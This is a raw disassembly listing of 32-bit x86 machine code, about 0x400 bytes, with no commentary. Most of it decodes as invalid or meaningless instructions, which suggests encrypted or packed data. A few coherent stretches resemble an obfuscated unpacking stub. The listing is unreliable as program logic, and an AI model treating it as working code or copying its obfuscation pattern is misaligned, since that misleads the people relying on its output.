  403c13:	xor    ecx,DWORD PTR [edx+0x1302ca55]
  403c19:	leave  
  403c1a:	add    ecx,DWORD PTR [ecx]
  403c1c:	int3   
  403c1d:	outs   dx,DWORD PTR ds:[esi]
  403c1e:	pop    edi
  403c1f:	cwde   
  403c20:	push   ss
  403c21:	lds    esp,FWORD PTR [ebp-0x7]
  403c24:	xchg   ebx,eax
  403c25:	retf   0xd03e
  403c28:	mov    al,ds:0x6a723136
  403c2d:	sub    BYTE PTR [edi+0x5c],0xe9
  403c31:	rcl    BYTE PTR [ebx+0x3f],0xd8
  403c35:	imul   DWORD PTR [ecx+edi*8-0x3477a0ec]
  403c3c:	inc    edi
  403c3d:	mov    dl,dh
  403c3f:	pop    esp
  403c40:	jno    0x403c5b
  403c42:	cmp    al,0xb6
  403c44:	fdivr  QWORD PTR [edi+0x5f296544]
  403c4a:	imul   esp,eax,0x35
  403c4d:	mov    bl,0xec
  403c4f:	ret    0xb8d8
  403c52:	and    ebp,ecx
  403c54:	jl     0x403c7a
  403c56:	inc    edi
  403c57:	imul   edi,DWORD PTR [edx],0xa4ab3b99
  403c5d:	ret    0x1f6d
  403c60:	cli    
  403c61:	loop   0x403cb6
  403c63:	jne    0x403c12
  403c65:	xchg   DWORD PTR [ebx-0x732ba32a],ebx
  403c6b:	or     eax,0xaaeb43b0
  403c70:	mov    WORD PTR [esi+0x192e0de1],fs
  403c76:	rcl    BYTE PTR [eax-0x4ba17c59],0x70
  403c7d:	push   edx
  403c7e:	mov    ds:0x5934b467,al
  403c83:	clc    
  403c84:	shr    BYTE PTR ds:0x8ab89908,cl
  403c8a:	cmovg  eax,DWORD PTR [edx-0x59]
  403c8e:	mov    al,BYTE PTR [ebp-0x2f]
  403c91:	add    eax,DWORD PTR [edi+ebp*4-0x74b3d032]
  403c98:	jmp    0x62a41ec6
  403c9d:	push   0xffffffa2
  403c9f:	popf   
  403ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca1:	dec    DWORD PTR [edi]
  403ca3:	mov    DWORD PTR [eax],eax
  403ca5:	pop    eax
  403ca6:	xchg   esp,eax
  403ca7:	cmp    DWORD PTR [edx],esp
  403ca9:	jo     0x403c43
  403cab:	xor    dl,BYTE PTR [eax+0xa0bbbe0]
  403cb1:	inc    ebp
  403cb2:	sbb    al,BYTE PTR [ebp-0x32]
  403cb5:	jg     0x4dae2ddc
  403cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cbc:	xchg   edx,eax
  403cbd:	push   ecx
  403cbe:	fadd   QWORD PTR [eax]
  403cc0:	jae    0x403cb3
  403cc2:	int3   
  403cc3:	mov    ebx,esp
  403cc5:	push   0x15805fbd
  403cca:	pop    es
  403ccb:	test   esi,eax
  403ccd:	jnp    0x403c76
  403ccf:	mov    eax,DWORD PTR [ebp-0x652664ed]
  403cd5:	retf   0xa32b
  403cd8:	sbb    DWORD PTR [ecx-0x54561682],0xffffffa2
  403cdf:	data16 (bad) 
  403ce1:	icebp  
  403ce2:	outs   dx,DWORD PTR ds:[esi]
  403ce3:	push   edi
  403ce4:	xor    al,0xa9
  403ce6:	mov    al,ds:0x44bf03ad
  403ceb:	test   al,0x81
  403ced:	(bad)  
  403cee:	xchg   esi,eax
  403cef:	sub    DWORD PTR [edx-0x2f],edx
  403cf2:	inc    ecx
  403cf3:	lods   al,BYTE PTR es:[esi]
  403cf5:	loopne 0x403d1f
  403cf7:	push   es
  403cf8:	bound  ebp,QWORD PTR [edx]
  403cfa:	and    ah,ah
  403cfc:	repz xor eax,0xa6ed2ac7
  403d02:	push   edx
  403d03:	jb     0x403cf2
  403d05:	enter  0x3aad,0x23
  403d09:	imul   ecx,esp,0x23
  403d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0d:	(bad)  
  403d0e:	or     DWORD PTR ds:0x9cdde8fb,ecx
  403d14:	mov    ds:0xfcd10aa6,al
  403d19:	in     eax,0xdd
  403d1b:	faddp  st(5),st
  403d1d:	and    eax,0xd7d59252
  403d22:	xchg   edi,eax
  403d23:	stc    
  403d24:	mov    bh,0x7c
  403d26:	aas    
  403d27:	dec    eax
  403d28:	sti    
  403d29:	ja     0x403d41
  403d2b:	mov    esp,0x5161958e
  403d30:	fcomp  QWORD PTR [esi]
  403d32:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403d34:	std    
  403d35:	mov    dl,0xd
  403d37:	test   dh,dh
  403d39:	das    
  403d3a:	icebp  
  403d3b:	cwde   
  403d3c:	push   ds
  403d3d:	test   DWORD PTR [ebx],esp
  403d3f:	jne    0x403d8e
  403d41:	fidivr DWORD PTR [ebp-0x44]
  403d44:	add    DWORD PTR [ebx+0x41d460dd],ebp
  403d4a:	mov    ebx,0xac360603
  403d4f:	loope  0x403d99
  403d51:	dec    edx
  403d52:	in     al,0x66
  403d54:	das    
  403d55:	mov    ecx,0xd768a16f
  403d5a:	nop
  403d5b:	push   ss
  403d5c:	retf   
  403d5d:	cwde   
  403d5e:	pushf  
  403d5f:	push   edi
  403d60:	adc    al,0xd5
  403d62:	bound  ecx,QWORD PTR [ecx-0x1e24f1c5]
  403d68:	xchg   BYTE PTR ds:0x8b77b765,ah
  403d6e:	sbb    dh,BYTE PTR [eax-0x43]
  403d71:	out    0xa9,eax
  403d73:	sbb    eax,0xc5a77f32
  403d78:	imul   eax,DWORD PTR [ebp+eax*4+0x7c],0x70
  403d7d:	das    
  403d7e:	ret    0x6f0a
  403d81:	out    dx,eax
  403d82:	je     0x403df8
  403d84:	cmp    eax,0x7c98a7c1
  403d89:	dec    esp
  403d8a:	mov    dh,0xac
  403d8c:	cmp    bl,BYTE PTR [ecx]
  403d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d8f:	sub    eax,eax
  403d91:	add    eax,0xe9e52685
  403d96:	sub    eax,ecx
  403d98:	jge    0x403d56
  403d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d9b:	sub    esi,DWORD PTR [ecx-0x76]
  403d9e:	test   eax,0x982fa605
  403da3:	ds xchg ebp,eax
  403da5:	xchg   ebp,ebp
  403da7:	pop    DWORD PTR [eax+0x47]
  403daa:	fsub   DWORD PTR [edx]
  403dac:	inc    DWORD PTR [eax-0x627cb65a]
  403db2:	out    dx,eax
  403db3:	add    BYTE PTR [edi+ebx*8],dh
  403db6:	dec    ecx
  403db7:	mov    ebp,0xe4e5e1e3
  403dbc:	dec    ecx
  403dbd:	repnz aam 0xd
  403dc0:	lea    edi,[ebx-0x7f]
  403dc3:	and    eax,DWORD PTR [ebx-0x267c5b37]
  403dc9:	jnp    0x403e0f
  403dcb:	pop    es
  403dcc:	jno    0x403d57
  403dce:	imul   ebx,ecx,0x49
  403dd1:	in     eax,0x8f
  403dd3:	push   es
  403dd4:	xchg   esi,eax
  403dd6:	(bad)  
  403dd7:	daa    
  403dd8:	fiadd  DWORD PTR [edx+0x46df592f]
  403dde:	sbb    al,0xbd
  403de0:	pop    eax
  403de1:	nop
  403de2:	adc    ecx,DWORD PTR [esp+ebx*1]
  403de5:	push   ds
  403de6:	out    0x15,al
  403de8:	ret    0x2a93
  403deb:	shl    DWORD PTR [ecx+0xa],1
  403dee:	ret    
  403def:	adc    DWORD PTR ds:0x36c919f,ebp
  403df5:	mov    esp,0x70b440d9
  403dfa:	push   0xc865a55c
  403dff:	push   es
  403e00:	pop    esp
  403e01:	fistp  QWORD PTR [eax+eiz*4]
  403e04:	sbb    DWORD PTR [edx+0x6b],0xe8f8315b
  403e0b:	xlat   BYTE PTR ds:[ebx]
  403e0c:	pop    edx
  403e0d:	cli    
  403e0e:	jno    0x403e3a
  403e10:	cmp    DWORD PTR [ecx+0x31],ebp
  403e13:	cmc    
  403e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e15:	mov    esi,0xe9069772
  403e1a:	add    al,0x31
  403e1c:	mov    dh,0x28
  403e1e:	aaa    
  403e1f:	push   esp
  403e20:	stos   BYTE PTR es:[edi],al
  403e21:	outs   dx,BYTE PTR ss:[esi]
  403e23:	xchg   ebx,eax
  403e24:	(bad)  
  403e25:	xor    DWORD PTR [ebx+ebp*4],esi
  403e28:	(bad)  
  403e29:	or     al,0x14
  403e2b:	or     al,0xa3
  403e2d:	inc    esp
  403e2e:	std    
  403e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e30:	not    cl
  403e32:	test   BYTE PTR [esi+0x11],0xf2
  403e36:	push   ebx
  403e37:	ret    0xa8c6
  403e3a:	fimul  DWORD PTR [ebx+eiz*4-0x36]
  403e3e:	fiadd  WORD PTR [eax]
  403e40:	and    al,ch
  403e42:	mov    dh,0xa2
  403e44:	mov    ebp,0x29dbf11e
  403e49:	nop
  403e4a:	leave  
  403e4b:	sub    eax,0x6c20a4e0
  403e50:	jmp    0x42e5:0x4af96b02
  403e57:	idiv   DWORD PTR [eax+0x2580a655]
  403e5d:	and    al,ch
  403e5f:	das    
  403e60:	mov    dl,0x29
  403e62:	xchg   esp,eax
  403e63:	sar    BYTE PTR [eax],cl
  403e65:	int    0xaa
  403e67:	(bad)  
  403e68:	sub    DWORD PTR [ebp-0x38],esp
  403e6b:	lods   al,BYTE PTR ds:[esi]
  403e6c:	dec    esi
  403e6d:	arpl   WORD PTR [edi+0x433f6aa2],bp
  403e73:	imul   eax,DWORD PTR [edi],0x95246d11
  403e79:	(bad)  
  403e7a:	jmp    0x403e28
  403e7c:	mov    ds:0x903f4c3e,eax
  403e81:	mov    ecx,edi
  403e83:	push   0x6a
  403e85:	push   cs
  403e86:	mov    al,ds:0x30b71425
  403e8b:	pop    es
  403e8c:	xor    BYTE PTR [esi+ebp*8+0x4a],0xaf
  403e91:	adc    DWORD PTR [ecx],eax
  403e93:	imul   edi,DWORD PTR [esi+0x5b1379ee],0xffffff83
  403e9a:	ret    
  403e9b:	(bad)  
  403e9c:	pop    esi
  403e9d:	aad    0x7a
  403e9f:	or     ecx,DWORD PTR [edi]
  403ea1:	adc    BYTE PTR [edx-0x20],0xff
  403ea5:	adc    al,0xf3
  403ea7:	int3   
  403ea8:	pop    ebx
  403ea9:	sbb    esp,edi
  403eab:	add    al,0x6d
  403ead:	adc    al,BYTE PTR [ecx-0xccbe501]
  403eb3:	dec    ebp
  403eb4:	in     eax,0x51
  403eb6:	mov    DWORD PTR [ebx],ebp
  403eb8:	xor    eax,0xa6749f2d
  403ebd:	cmp    al,0x7b
  403ebf:	lea    edi,[ebx+eax*8-0x1a17b8f3]
  403ec6:	or     eax,0x1bbce26b
  403ecb:	pop    esi
  403ecc:	add    al,0xd6
  403ece:	ret    
  403ecf:	sub    ecx,edx
  403ed1:	sbb    eax,0x616ce6d4
  403ed6:	lahf   
  403ed7:	into   
  403ed8:	jle    0x403ef3
  403eda:	sbb    dl,ah
  403edc:	and    BYTE PTR [edi+0x1c],0x14
  403ee0:	xchg   ebx,eax
  403ee1:	nop
  403ee2:	dec    eax
  403ee3:	sbb    ebp,DWORD PTR [edx+0x5d]
  403ee6:	add    ebx,DWORD PTR [edx]
  403ee8:	fstp   QWORD PTR [eax+0x4807941b]
  403eee:	leave  
  403eef:	adc    eax,0x33846336
  403ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ef5:	dec    esp
  403ef6:	push   edx
  403ef7:	jecxz  0x403edc
  403ef9:	mov    ch,0x58
  403efb:	stos   BYTE PTR es:[edi],al
  403efc:	outs   dx,BYTE PTR ds:[esi]
  403efd:	adc    ebx,DWORD PTR [eax-0x6d]
  403f00:	aad    0x65
  403f02:	out    0x99,eax
  403f04:	or     esi,DWORD PTR [edx-0x4e21873f]
  403f0a:	scas   eax,DWORD PTR es:[edi]
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x42817f,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281ff
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42838b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428247,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x6ea86644],ch
  403f58:	jo     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [esi+0x582eebe3],bh
  403f66:	mov    ch,0x57
  403f68:	aam    0xca
  403f6a:	arpl   WORD PTR [eax-0x59ba0d77],sp
  403f70:	retf   0xa0b9
  403f73:	xchg   edx,eax
  403f74:	shl    DWORD PTR [ebx-0x1e],0x69
  403f78:	jno    0x403f0f
  403f7a:	shl    BYTE PTR [eax],1
  403f7c:	jno    0x403fda
  403f7e:	mov    ds:0xb8c05f94,eax
  403f83:	mov    DWORD PTR [edx+0x32],ecx
  403f86:	add    ah,BYTE PTR [esi-0x63]
  403f89:	xor    BYTE PTR [eax+ecx*2-0x621d42f8],al
  403f90:	adc    eax,0x6b5a8c55
  403f95:	shl    DWORD PTR [edi+0x67],cl
  403f98:	jo     0x403fdc
  403f9a:	xor    BYTE PTR [ecx-0x2c5dc3a1],ch
  403fa0:	push   esp
  403fa1:	push   edx
  403fa2:	sbb    ah,BYTE PTR [esp+esi*1]
  403fa5:	out    0x75,al
  403fa7:	and    BYTE PTR ds:0x53174689,dh
  403fad:	shl    DWORD PTR [ecx],cl
  403faf:	fild   WORD PTR [ecx+esi*8]
  403fb2:	(bad)  
  403fb3:	jb     0x403ff2
  403fb5:	adc    eax,0x97ecfbcf
  403fba:	es stos BYTE PTR es:[edi],al
  403fbc:	sub    al,0xb0
  403fbe:	jmp    0x73e036d8
  403fc3:	xchg   esi,eax
  403fc4:	sbb    eax,0xb981fac3
  403fc9:	mov    ebp,0x7862a9be
  403fce:	pop    eax
  403fcf:	icebp  
  403fd0:	jne    0x403ffd
  403fd2:	cwde   
  403fd3:	sub    dl,ah
  403fd5:	add    dh,ah
  403fd7:	call   0x93bce993
  403fdc:	aas    
  403fdd:	or     dh,cl
  403fdf:	iret   
  403fe0:	ins    DWORD PTR es:[edi],dx
  403fe1:	inc    eax
  403fe2:	dec    esp
  403fe3:	fild   QWORD PTR [edi+0x51b86cc4]
  403fe9:	xor    ebp,eax
  403feb:	gs popa 
  403fed:	daa    
  403fee:	pop    edx
  403fef:	mov    DWORD PTR ss:[edx-0x18bd953b],edx
  403ff6:	arpl   bx,bx
  403ff8:	or     BYTE PTR [esp+edi*1+0x53],bl
  403ffc:	and    DWORD PTR [edx-0x43f52b0a],0xfffffff1
  404003:	push   0xd97341bd
  404008:	pop    edi
  404009:	out    0xe,al
  40400b:	xchg   BYTE PTR [ebx+esi*2-0x1a],ah
  40400f:	push   ebx
  404010:	xor    DWORD PTR [edx+0x76ba0c85],esi
  404016:	jae    0x404092
  404018:	out    0x61,eax
  40401a:	repnz lods al,BYTE PTR ds:[esi]
  40401c:	jp     0x40407e
  40401e:	or     eax,0x6f286f81
  404023:	mov    edx,ebp
  404025:	dec    esp
  404026:	jle    0x404082
  404028:	xchg   esi,eax
  404029:	aam    0x8e
  40402b:	dec    eax
  40402c:	retf   0x3acd
  40402f:	adc    al,0x3a
  404031:	iret   
  404032:	mov    bh,0xc9
  404034:	adc    eax,0xd524dceb
  404039:	mov    ebx,0xf765eeaa
  40403e:	lea    ebp,[ecx+eax*1]
  404041:	xchg   ebp,eax
  404042:	xchg   BYTE PTR fs:[ebx+0x22ca0dcd],bh
  404049:	adc    ebx,edi
  40404b:	mov    dl,0x44
  40404d:	mov    al,ds:0x5c13b25f
  404052:	adc    eax,0x512136c6
  404057:	mov    eax,gs:0x7f67342c
  40405d:	fwait
  40405e:	jecxz  0x404008
  404060:	sti    
  404061:	push   0x5d
  404063:	mov    eax,0x7aabcb69
  404068:	shr    DWORD PTR [ecx],0x37
  40406b:	xchg   ebx,eax
  40406c:	inc    ebx
  40406d:	sub    eax,0xc5974dd1
  404072:	mov    esi,0xa0e8c162
  404077:	ss dec ebp
  404079:	xor    DWORD PTR [esi],edx
  40407b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40407c:	cwde   
  40407d:	fisttp QWORD PTR [ecx]
  40407f:	fs (bad) 
  404081:	inc    ebx
  404082:	imul   ebx,DWORD PTR [edx],0xffffffcd
  404085:	stc    
  404086:	ja     0x4040d3
  404088:	push   0x16
  40408a:	adc    cl,ch
  40408c:	cmp    eax,0x843321d4
  404091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404092:	je     0x4040c5
  404094:	call   0x96179be6
  404099:	fld    TBYTE PTR [edi+0x5ab257db]
  40409f:	inc    edx
  4040a0:	adc    eax,0xddc106a9
  4040a5:	fdiv   st,st(4)
  4040a7:	and    DWORD PTR [edx+0x69],0xfffffff8
  4040ab:	xor    esi,DWORD PTR [ecx-0x61]
  4040ae:	jge    0x404098
  4040b0:	es stos BYTE PTR es:[edi],al
  4040b2:	cmp    al,0xb0
  4040b4:	lds    ax,DWORD PTR [esi+0x68a6bbe8]
  4040bb:	(bad)
  4040bf:	or     al,0xfb
  4040c1:	bound  ecx,QWORD PTR [ebp-0x3534462e]
  4040c7:	jp     0x40413e
  4040c9:	or     ebp,DWORD PTR [ecx]
  4040cb:	lods   al,BYTE PTR ds:[esi]
  4040cc:	jg     0x40408c
  4040ce:	lock test eax,0x13bb846d
  4040d5:	cli    
  4040d6:	xchg   edi,ebp
  4040d8:	outs   dx,BYTE PTR ds:[si]
  4040da:	mov    ecx,edi
  4040dc:	shl    ch,1
  4040de:	mov    edx,0xc33926ff
  4040e3:	out    0xf9,eax
  4040e5:	push   0x55aaeb3b
  4040ea:	mov    gs,WORD PTR ds:0x8d7606c8
  4040f0:	repz inc edi
  4040f2:	sub    cl,bl
  4040f4:	nop
  4040f5:	shl    BYTE PTR [ebx+0x20],cl
  4040f8:	push   eax
  4040f9:	dec    edi
  4040fa:	daa    
  4040fb:	pop    esp
  4040fc:	sbb    ebx,DWORD PTR [ecx+0x37]
  4040ff:	je     0x4040cc
  404101:	and    eax,0xcbe72280
  404106:	cmp    al,0xe7
  404108:	lods   al,BYTE PTR ds:[esi]
  404109:	xor    edi,DWORD PTR [esi+0x49c9735c]
  40410f:	adc    dl,bl
  404111:	inc    ecx
  404112:	sub    dl,BYTE PTR [eax+0xa]
  404115:	xor    ecx,esi
  404117:	and    eax,0x74527c1
  40411c:	mov    esi,0x5077ab9a
  404121:	xchg   ecx,eax
  404122:	das    
  404123:	icebp  
  404124:	push   ss
  404125:	mov    ah,0x19
  404127:	outs   dx,BYTE PTR ds:[esi]
  404128:	cli    
  404129:	and    ecx,DWORD PTR [ebx+0x48]
  40412c:	mov    al,0x67
  40412e:	stos   DWORD PTR es:[edi],eax
  40412f:	mov    esp,0x19a45322
  404134:	xchg   ebp,eax
  404135:	mov    ss,WORD PTR [eax+0x7c5a42c2]
  40413b:	xchg   esp,eax
  40413c:	int3   
  40413d:	fcom   QWORD PTR [ecx-0x1fbe6ba3]
  404143:	fidivr DWORD PTR [esi+0x76]
  404146:	mov    edx,0xf69fc1c1
  40414b:	dec    ebp
  40414c:	and    ch,BYTE PTR [ecx+0x36]
  40414f:	push   edi
  404150:	lea    ecx,[eax+0x7ca13dd3]
  404156:	lods   al,BYTE PTR ds:[esi]
  404157:	aaa    
  404158:	aad    0x73
  40415a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40415b:	inc    edx
  40415c:	xchg   BYTE PTR fs:[ebx+edi*4+0x3e],dh
  404161:	add    eax,0x66715cda
  404166:	dec    esp
  404167:	mov    dl,BYTE PTR [eax-0x34]
  40416a:	cdq    
  40416b:	mov    al,0x35
  40416d:	xchg   ecx,eax
  40416e:	jnp    0x4040f7
  404170:	test   DWORD PTR [eax+0x3d],ebx
  404173:	push   esp
  404174:	fwait
  404175:	xor    ebx,DWORD PTR [ecx-0x7f]
  404178:	dec    ecx
  404179:	arpl   WORD PTR [esp+esi*8+0x6e],sp
  40417d:	mov    ds:0x31a36ba,al
  404182:	adc    esp,DWORD PTR [ecx]
  404184:	imul   esp,DWORD PTR [eax+0x14b2e8e7],0xffffff93
  40418b:	(bad)  
  40418c:	fst    DWORD PTR [eax+0x4473056c]
  404192:	jae    0x40419e
  404194:	pusha  
  404195:	ja     0x40419c
  404197:	add    ah,BYTE PTR [eax]
  404199:	mov    eax,ds:0xcc22fba7
  40419e:	int    0x1
  4041a0:	sub    eax,0x5719d98e
  4041a5:	mov    ecx,0x86ab9561
  4041aa:	shl    BYTE PTR [eax+0x30],0x56
  4041ae:	or     al,0xf2
  4041b0:	and    BYTE PTR [ecx+edx*2+0xc],ah
  4041b4:	fisttp QWORD PTR [esi+0x77]
  4041b7:	xor    al,0x1c
  4041b9:	sbb    al,0x14
  4041bb:	pop    esi
  4041bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041bd:	(bad)  
  4041bf:	mov    eax,0xe3964c5
  4041c4:	mov    ch,0x28
  4041c6:	add    al,0x30
  4041c8:	ja     0x4041e2
  4041ca:	mov    ch,0xe9
  4041cc:	cwde   
  4041cd:	lods   al,BYTE PTR ds:[esi]
  4041ce:	fimul  DWORD PTR gs:[ebp-0x34]
  4041d2:	push   edi
  4041d3:	add    eax,0x6ef36310
  4041d8:	mov    eax,ds:0x851b6006
  4041dd:	(bad)  
  4041de:	loope  0x40417c
  4041e0:	ds out dx,al
  4041e2:	int3   
  4041e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041e4:	jb     0x404232
  4041e6:	add    eax,edx
  4041e8:	clc    
  4041e9:	mul    bl
  4041eb:	test   eax,0x40b3774b
  4041f0:	adc    eax,0x3f7d28e7
  4041f5:	enter  0xd713,0x3c
  4041f9:	repnz aaa 
  4041fb:	or     BYTE PTR [ebp+0x51],0xce
  4041ff:	loope  0x40421f
  404201:	mov    ebp,0x1fc39751
  404206:	neg    ebx
  404208:	and    esp,esp
  40420a:	lahf   
  40420b:	out    dx,eax
  40420c:	mov    ds:0x801660e4,al
  404211:	mov    bh,0xb6
  404213:	xchg   ebp,eax
  404214:	adc    edx,esi
  404216:	(bad)  
  404217:	fild   WORD PTR [ebx-0x36]
  40421a:	and    BYTE PTR [ecx],dh
  40421c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40421d:	jae    0x4041e0
  40421f:	mov    gs,WORD PTR ds:0x97733c45
  404225:	push   cs
  404226:	in     al,dx
  404227:	stos   DWORD PTR es:[edi],eax
  404228:	gs das 
  40422a:	inc    esi
  40422b:	dec    ebp
  40422c:	out    dx,eax
  40422d:	dec    eax
  40422e:	push   ecx
  40422f:	stos   DWORD PTR es:[edi],eax
  404230:	retf   
  404231:	jnp    0x4041f5
  404233:	cdq    
  404234:	(bad)
  404237:	mov    ds:0x31980732,al
  40423c:	scas   al,BYTE PTR es:[edi]
  40423d:	shl    BYTE PTR [edx-0x5a82e112],0xc4
  404244:	dec    ecx
  404245:	fld    TBYTE PTR [eax-0x38898f24]
  40424b:	(bad)  
  40424c:	test   al,0xd3
  40424e:	and    al,BYTE PTR [ebx]
  404250:	inc    esi
  404251:	out    dx,al
  404252:	sbb    esi,DWORD PTR [edx]
  404254:	sub    al,0x1
  404256:	ror    DWORD PTR [edx-0x219a36d6],1
  40425c:	fimul  DWORD PTR [ebx-0x59]
  40425f:	fwait
  404260:	jmp    0xf7899682
  404265:	fsubr  DWORD PTR [ecx]
  404267:	imul   eax,DWORD PTR [esi-0x4ee5bf54],0xffffff82
  40426e:	popa   
  40426f:	popa   
  404270:	mov    al,ds:0xb0eebfd9
  404275:	call   0x8515:0xae3bfb79
  40427c:	and    ecx,DWORD PTR [edx+0x7c049799]
  404282:	pop    ebx
  404283:	mov    edi,0x7fb83eed
  404288:	adc    esp,esi
  40428a:	pop    ss
  40428b:	stos   DWORD PTR es:[edi],eax
  40428c:	(bad)  
  40428d:	fld    QWORD PTR [eax-0x2f]
  404290:	mov    eax,0xd11b4eb
  404295:	int    0xa6
  404297:	lock sbb ebp,edx
  40429a:	lods   al,BYTE PTR ds:[esi]
  40429b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40429c:	retf   0x9a39
  40429f:	push   0xffffffa4
  4042a1:	scas   eax,DWORD PTR es:[edi]
  4042a2:	fild   WORD PTR [edx+0x59]
  4042a5:	mov    dh,0xc0
  4042a7:	mov    ecx,0xbbee31cb
  4042ac:	imul   esi,edi,0x3c
  4042af:	pop    esp
  4042b0:	add    cl,ah
  4042b2:	jne    0x40431e
  4042b4:	imul   ebx,DWORD PTR [esi+0x6d3e75b],0xffffffb6
  4042bb:	dec    esi
  4042bc:	cdq    
  4042bd:	fdivrp st(3),st
  4042bf:	mov    ds:0x4dcedcff,al
  4042c4:	sti    
  4042c5:	gs dec ecx
  4042c7:	jno    0x4ce9fe59
  4042cd:	mov    al,BYTE PTR [edi-0x127d26dd]
  4042d3:	addr16 jg 0x404314
  4042d6:	sub    cl,BYTE PTR [edi+eax*4]
  4042d9:	in     eax,0x35
  4042db:	shl    BYTE PTR [edx],cl
  4042dd:	jmp    0xb73b:0xaf32e9ef
  4042e4:	push   edx
  4042e5:	je     0x404288
  4042e7:	and    al,0x74
  4042e9:	ret    0xe204
  4042ec:	sub    eax,esp
  4042ee:	lea    eax,[esi]
  4042f0:	sti    
  4042f1:	add    edi,DWORD PTR [ebx+0x5c2e56f9]
  4042f7:	jne    0x4042a5
  4042f9:	cdq    
  4042fa:	xor    eax,DWORD PTR [edx-0xa]
  4042fd:	jecxz  0x4042ba
  4042ff:	les    esp,FWORD PTR [eax-0x52]
  404302:	jecxz  0x404297
  404304:	arpl   WORD PTR ds:0xf41d8905,bx
  40430a:	jo     0x404359
  40430c:	fdiv   DWORD PTR [ecx+0x18]
  40430f:	xor    bl,BYTE PTR [edx]
  404311:	and    al,0xa1
  404313:	push   esp
  404314:	bound  ebp,QWORD PTR [esi]
  404316:	fwait
  404317:	inc    eax
  404318:	push   edi
  404319:	push   es
  40431a:	inc    eax
  40431b:	(bad)  
  40431c:	jecxz  0x4042a5
  40431e:	mov    edx,0x8b392eab
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42824b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42827b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282f7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428237
  404344:	and    DWORD PTR ds:0x428397,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42837f
  404355:	sbb    DWORD PTR ds:0x42828b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	jmp    0x55bcf934
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [esi-0x43],bh
  40437d:	and    al,0xcb
  404380:	cmc    
  404381:	inc    edx
  404382:	or     esp,DWORD PTR [ebp+ebp*4-0x3f4df19d]
  404389:	cwde   
  40438a:	sbb    BYTE PTR ds:0x91e1349f,0x7c
  404391:	cmp    eax,DWORD PTR [ebx+0x17]
  404394:	out    dx,eax
  404395:	lods   al,BYTE PTR ds:[esi]
  404396:	add    ecx,DWORD PTR [eax-0x35]
  404399:	inc    eax
  40439a:	mov    ebp,0xa4aa1505
  40439f:	adc    ah,0x65
  4043a2:	and    DWORD PTR [ebx+eax*2],ecx
  4043a5:	retf   0xe901
  4043a8:	into   
  4043a9:	adc    DWORD PTR [edi],edx
  4043ab:	add    al,0x57
  4043ad:	popf   
  4043ae:	cmp    ecx,DWORD PTR [ecx-0x4c]
  4043b1:	shl    BYTE PTR [edi+0x1c1d96cc],1
  4043b7:	mov    edi,0x77535210
  4043bc:	push   ebp
  4043bd:	push   edx
  4043be:	mov    eax,ds:0xae6cbbfd
  4043c3:	pop    ebx
  4043c4:	sbb    BYTE PTR [esi+ebp*2+0x1b],dh
  4043c8:	sub    al,0x8
  4043ca:	ret    
  4043cb:	clc    
  4043cc:	xor    ebx,DWORD PTR [ebp-0x3510f3]
  4043d2:	pop    ecx
  4043d3:	xor    al,0xf6
  4043d5:	jp     0x404425
  4043d7:	lock cwde 
  4043d9:	call   0xa289:0xc062ea30
  4043e0:	mov    esi,edi
  4043e2:	push   ebp
  4043e3:	mov    al,0x51
  4043e5:	mov    cs,WORD PTR [eax]
  4043e7:	outs   dx,DWORD PTR ds:[esi]
  4043e8:	hlt    
  4043e9:	xlat   BYTE PTR ds:[ebx]
  4043ea:	inc    ebx
  4043eb:	inc    ebp
  4043ec:	in     eax,0x81
  4043ee:	push   ds
  4043ef:	rcl    DWORD PTR [ecx+0x774157cd],1
  4043f5:	scas   al,BYTE PTR es:[edi]
  4043f6:	lock nop
  4043f8:	ja     0x404389
  4043fa:	pop    ebp
